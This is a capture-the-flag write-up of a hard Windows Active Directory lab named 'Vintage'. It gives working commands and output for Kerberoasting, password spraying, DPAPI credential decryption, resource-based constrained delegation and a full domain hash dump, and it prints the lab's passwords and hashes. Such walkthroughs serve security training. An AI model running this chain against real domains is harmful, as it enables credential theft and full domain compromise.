## Vintage

### Lab Details 

- Difficulty: Hard
- Type: Kerberos Authentication, Resource-Based Constrained Delegation Attack,  Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-18 01:25:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
51147/tcp open  msrpc         Microsoft Windows RPC
```
- given credential `P.Rosa / Rosaisbest123`
 `SMB`
	 - no `smb` access
`bloodhound`
- run bloodhound with credential provided
![[p.rosa bloodhound.png]]
#### Initial Foothold 
- enumerate AD with bloodhound and found machine account with `Pre-Windows 2000 Compatible Access` group access
- according to [this blog post](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts)
- the password for this machine account will be the lowercase of the username in lowercase without `$` like `fs01` due to the way the `Pre-created computer accounts` are set up
![[fs01 bloodhound.png]]
- verifying our finding with `nxc`
```bash
$ netexec ldap 10.129.231.205 -d vintage.htb -u 'fs01$' -p 'fs01' -k
LDAP        10.129.231.205  389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
LDAP        10.129.231.205  389    dc01.vintage.htb [+] vintage.htb\fs01$:fs01 
```
- check `bloodhound` again and we see that `FS01$` is part of the `domain computers` which has `ReadGMSAPassword` over `GMSA01$` machine account
![[fs01 to gmsa bloodhound.png]]
- and the `GMSA01$` machine accounts has rights over 3 services accounts over `Service Managers` Group
![[gmsa bloodhound.png]]
- first lets add dump the `GMSA password` of `GMSA01$`
```bash
$ getTGT.py vintage.htb/'fs01$':fs01
$ export KRB5CCNAME=fs01$.ccache
$ python3 ./bloodyAD/bloodyAD.py -d vintage.htb -k -u 'fs01$' -p fs01 --host "dc01.vintage.htb" get object "CN=c,CN=MANAGED SERVICE ACCOUNTS,DC=VINTAGE,DC=HTB" --attr msDS-ManagedPassword

distinguishedName: CN=GMSA01,CN=MANAGED SERVICE ACCOUNTS,DC=VINTAGE,DC=HTB
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:3cc51fff9dfca7dc208252d1c570bb38
msDS-ManagedPassword.B64ENCODED: 2AWPGtq5oeMIDA4gk+mihiGnbcc34aLR2KvVBj6sHj+YifC0cJAdAmhaomIRfAWc9giDMOUYF9n+FnJkvn3rci7FtIT5Ug9wjMwL9mKl78WjaWSTpGkBFja8TtL2Gs9skg/Ma0gfckV/w5FJx1BODB9s3ty1nS/LY+/omWpXfJ8w4QF1JqqL0nLBBqMQJ4wrZmhxbkQ91O6Vk6H5DdptMaUOVSh0Y3kuYB4zyp6V4vVIdno6UpbZsJ3Sdx/ep2j8F3xlj+zK/XHcP0eUJeahloCHx4PoltgKBvy0UDP3wXJmf2MvW/dhw9ErBlHZhq7cpXCIjkAoxTB8Cs/j6csEgg==
```
- then we can then add `GMSA01$` to the `servicemanagers` group which will give us `GenericAll` access to three different service accounts
-  add `GMSA01$` to `servicemanagers` group 
```bash
$ getTGT.py vintage.htb/'GMSA01$' -hashes aad3b435b51404eeaad3b435b51404ee:3cc51fff9dfca7dc208252d1c570bb38
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in GMSA01$.ccache

$ export KRB5CCNAME=./'GMSA01$.ccache'

$ ./bloodyAD/bloodyAD.py -d vintage.htb -k --host "dc01.vintage.htb" add groupMember ServiceManagers 'GMSA01$'
[+] GMSA01$ added to ServiceManagers
```
- we can dump the passwords of the service accounts but before that `svc_sql`account is disabled, first we must enable it 
```bash
$ ./bloodyAD/bloodyAD.py -d vintage.htb -k --host "dc01.vintage.htb" set object svc_sql servicePrincipalName -v 'attck/er'
```
- once we have enabled it we can dump the service accounts password hashes using `targetedKerberoast.py`
```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git

$ KRB5CCNAME=./GMSA01\$.ccache python3 ./targetedKerberoast/targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (svc_sql)
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$41657525b5c7af6433485389fbb3e79d$004a546ed5f2cd353965e74e768d0dd70430e191dae00978bbd753d789a0f6923ddbb50726c6bb6ab1f55fa5ecd6ffaaaedf1ef0bd5edf42e2417db7244a6d051<snip>
```
- decrypt the hash using `hashcat`
```bash
$ hashcat -m 13100 ./svc_sql.hash /usr/share/wordlists/rockyou.txt
Zer0the0ne
```
- we get plain text password `Zer0the0ne`
- before password spray using `nxc` we will need to get AD users, we can use `GMSA01$` credential to find AD users
```bash
$ nxc ldap 10.129.195.50 -d vintage.htb -u 'GMSA01$' -H 'b3a15bbdfb1c53238d4b50ea2c4d1178' -k --users
```
- save the user to a list and password spray with `Zer0the0ne` 
```bash
$ nxc ldap 10.129.195.50 -d vintage.htb -u users.txt -p 'Zer0the0ne' -k --continue-on-success
LDAP        10.129.195.50   389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
LDAP        10.129.195.50   389    dc01.vintage.htb [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.195.50   389    dc01.vintage.htb [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.195.50   389    dc01.vintage.htb [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.195.50   389    dc01.vintage.htb [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.195.50   389    dc01.vintage.htb [+] vintage.htb\C.Neri:Zer0the0ne 
LDAP        10.129.195.50   389    dc01.vintage.htb [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.195.50   389    dc01.vintage.htb [-] vintage.htb\svc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED
LDAP        10.129.195.50   389    dc01.vintage.htb [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.195.50   389    dc01.vintage.htb [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.195.50   389    dc01.vintage.htb [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.195.50   389    dc01.vintage.htb [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
```
- user password for `C.Neri:Zer0the0ne`
- get `TGT` ticket for `C.Neri` in order to `evil-winrm` access
```bash
$ getTGT.py vintage.htb/'C.Neri':Zer0the0ne
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in C.Neri.ccache
```
- export the ticket
```bash
$ export KRB5CCNAME=./C.Neri.ccache 
```
- we need to specify the  `kerbros` config for the domain
```bash
$ echo '[libdefaults]
default_realm = VINTAGE.HTB
dns_lookup_realm = false
dns_lookup_kdc = false
[realms]
VINTAGE.HTB = {
kdc = dc01.vintage.htb
admin_server = dc01.vintage.htb
}
[domain_realm]
.vintage.htb = VINTAGE.HTB
vintage.htb = VINTAGE.HTB' | tee -a krb5.conf

$ export KRB5_CONFIG=`pwd`/krb5.conf
```
- get `evil-winrm` access as user `C.Neri`
```bash
$ evil-winrm -i dc01.vintage.htb -r vintage.htb 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents>
```

#### Lateral Movement (If any)
- cannot run `winPEAS.exe` due to active anti-virus
```powershell
*Evil-WinRM* PS C:\Users\C.Neri> ./winPEASx86.exe
Program 'winPEASx86.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ ./winPEASx86.exe
+ ~~~~~~~~~~~~~~~~.
At line:1 char:1
+ ./winPEASx86.exe
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```
- check for credentials in `Windows Credential Manager`
- found a credential file
```powershell
*Evil-WinRM* PS C:\Users\C.Neri\appdata\roaming\microsoft\credentials> ls -force


    Directory: C:\Users\C.Neri\appdata\roaming\microsoft\credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6
```
- look for master key to decrypt the `dpapi` credential
```powershell
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> ls -force


    Directory: C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred
```
- found `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`
- download the `dpapi` file and master key file from remote by `base64` encoding the files
```powershell
*Evil-WinRM* PS C:\Users\C.Neri\appdata\roaming\microsoft\credentials> [Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\C4BB96844A5C9DD45D5B6A9859252BA6"))
AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==

*Evil-WinRM* PS C:\Temp> [Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))
AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=
```
- save the `base64` values in to two files and decode them using `base64`
```bash
$ cat 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b | base64 -d > 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b.cred
$ cat C4BB96844A5C9DD45D5B6A9859252BA6| base64 -d > C4BB96844A5C9DD45D5B6A9859252BA6.cred
```
- decrypt the master key with plain text password
```bash
$ impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b.cred  -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```
- decrypt the `dpapi` credential with the `decrypted key`
```bash
$ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6.cred -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a 

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```
- we get the plain text from `dpapi` credential

### Privilege Escalation 
- check `c.neri_adm` relationships in `bloodhound`
![[c.neri_adm bloodhound.png]]
- `C.NERI_ADM` has `AddSelf` privilege over `DELEGATEDADMINS` 
![[delegatedadmin group bloodhound.png]]
- and `DELEGATEDADMINS` has [`AllowedToAct`](https://bloodhound.specterops.io/resources/edges/allowed-to-act) privilege over `DC01`
- we can use `AllowedToAct` privilege to abuse resource-based constrained delegation to compromise the target
- first we will need an account with `SPN` and that account cannot be in the `protected users` group
- one of the accounts that we control is `fs01$`
- add `fs01$` to `delegated admins` group
```bash
$ python3 bloodyAD.py -d vintage.htb -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' --host dc01.vintage.htb -k add groupMember DelegatedAdmins 'fs01$'
[+] fs01$ added to DelegatedAdmins
```
- then we can attempt to impersonate `dc01$`
```bash
$ getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' -dc-ip 10.129.195.50 'vintage.htb/fs01$:fs01'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```
- we can then dump hashes in the domain
```bash
$ KRB5CCNAME='dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache' secretsdump.py -k dc01.vintage.htb -just-dc
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:3cc51fff9dfca7dc208252d1c570bb38:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5f22c4cf44bc5277d90b8e281b9ba3735636bd95a72f3870ae3de93513ce63c5
Administrator:aes128-cts-hmac-sha1-96:c119630313138df8cd2e98b5e2d018f7
Administrator:des-cbc-md5:c4d5072368c27fba
krbtgt:aes256-cts-hmac-sha1-96:8d969dafdd00d594adfc782f13ababebbada96751ec4096bce85e122912ce1f0
krbtgt:aes128-cts-hmac-sha1-96:3c7375304a46526c00b9a7c341699bc0
krbtgt:des-cbc-md5:e923e308752658df
M.Rossi:aes256-cts-hmac-sha1-96:14d4ea3f6cd908d23889e816cd8afa85aa6f398091aa1ab0d5cd1710e48637e6
M.Rossi:aes128-cts-hmac-sha1-96:3f974cd6254cb7808040db9e57f7e8b4
M.Rossi:des-cbc-md5:7f2c7c982cd64361
R.Verdi:aes256-cts-hmac-sha1-96:c3e84a0d7b3234160e092f168ae2a19366465d0a4eab1e38065e79b99582ea31
R.Verdi:aes128-cts-hmac-sha1-96:d146fa335a9a7d2199f0dd969c0603fb
R.Verdi:des-cbc-md5:34464a58618f8938
L.Bianchi:aes256-cts-hmac-sha1-96:abcbbd86203a64f177288ed73737db05718cead35edebd26740147bd73e9cfed
L.Bianchi:aes128-cts-hmac-sha1-96:92067d46b54cdb11b4e9a7e650beb122
L.Bianchi:des-cbc-md5:01f2d667a19bce25
G.Viola:aes256-cts-hmac-sha1-96:f3b3398a6cae16ec640018a13a1e70fc38929cfe4f930e03b1c6f1081901844a
G.Viola:aes128-cts-hmac-sha1-96:367a8af99390ebd9f05067ea4da6a73b
G.Viola:des-cbc-md5:7f19b9cde5dce367
C.Neri:aes256-cts-hmac-sha1-96:c8b4d30ca7a9541bdbeeba0079f3a9383b127c8abf938de10d33d3d7c3b0fd06
C.Neri:aes128-cts-hmac-sha1-96:0f922f4956476de10f59561106aba118
C.Neri:des-cbc-md5:9da708a462b9732f
P.Rosa:aes256-cts-hmac-sha1-96:f9c16db419c9d4cb6ec6242484a522f55fc891d2ff943fc70c156a1fab1ebdb1
P.Rosa:aes128-cts-hmac-sha1-96:1cdedaa6c2d42fe2771f8f3f1a1e250a
P.Rosa:des-cbc-md5:a423fe64579dae73
svc_sql:aes256-cts-hmac-sha1-96:3bc255d2549199bbed7d8e670f63ee395cf3429b8080e8067eeea0b6fc9941ae
svc_sql:aes128-cts-hmac-sha1-96:bf4c77d9591294b218b8280c7235c684
svc_sql:des-cbc-md5:2ff4022a68a7834a
svc_ldap:aes256-cts-hmac-sha1-96:d5cb431d39efdda93b6dbcf9ce2dfeffb27bd15d60ebf0d21cd55daac4a374f2
svc_ldap:aes128-cts-hmac-sha1-96:cfc747dd455186dba6a67a2a340236ad
svc_ldap:des-cbc-md5:e3c48675a4671c04
svc_ark:aes256-cts-hmac-sha1-96:820c3471b64d94598ca48223f4a2ebc2491c0842a84fe964a07e4ee29f63d181
svc_ark:aes128-cts-hmac-sha1-96:55aec332255b6da8c1344357457ee717
svc_ark:des-cbc-md5:6e2c9b15bcec6e25
C.Neri_adm:aes256-cts-hmac-sha1-96:96072929a1b054f5616e3e0d0edb6abf426b4a471cce18809b65559598d722ff
C.Neri_adm:aes128-cts-hmac-sha1-96:ed3b9d69e24d84af130bdc133e517af0
C.Neri_adm:des-cbc-md5:5d6e9dd675042fa7
L.Bianchi_adm:aes256-cts-hmac-sha1-96:529fa80540d759052c6beb161d5982435a37811b3ad2a338e81b75797c11959e
L.Bianchi_adm:aes128-cts-hmac-sha1-96:7e4599a7f84c2868e20141bdc8608bd7
L.Bianchi_adm:des-cbc-md5:8fa746971a98fedf
DC01$:aes256-cts-hmac-sha1-96:f8ceb2e0ea58bf929e6473df75802ec8efcca13135edb999fcad20430dc06d4b
DC01$:aes128-cts-hmac-sha1-96:a8f037cb02f93e9b779a84441be1606a
DC01$:des-cbc-md5:c4f15ef8c4f43134
gMSA01$:aes256-cts-hmac-sha1-96:7966d11566b1aad13254a615f11789f92dd14ae55a9ef93ebb6b16ed7c004fba
gMSA01$:aes128-cts-hmac-sha1-96:d0011e29b7a0662fb22433c23d1b7f19
gMSA01$:des-cbc-md5:2aef79763b76eff8
FS01$:aes256-cts-hmac-sha1-96:d57d94936002c8725eab5488773cf2bae32328e1ba7ffcfa15b81d4efab4bb02
FS01$:aes128-cts-hmac-sha1-96:ddf2a2dcc7a6080ea3aafbdf277f4958
FS01$:des-cbc-md5:dafb3738389e205b
[*] Cleaning up... 
```
- we can get `tgt` of user `l.bianchi_adm`
```bash
$ getTGT.py -hashes :6b751449807e0d73065b0423b64687f0 vintage.htb/'L.Bianchi_adm'@vintage.htb
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in L.Bianchi_adm@vintage.htb.ccache
```
- get reverse shell access as `l.bianchi_adm` via `wmiexec.py` to access `root.txt`
```bash
$ KRB5CCNAME=./'L.Bianchi_adm@vintage.htb.ccache' wmiexec.py -k dc01.vintage.htb
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
vintage\l.bianchi_adm
```
#### Resources

#### Lesson Learned
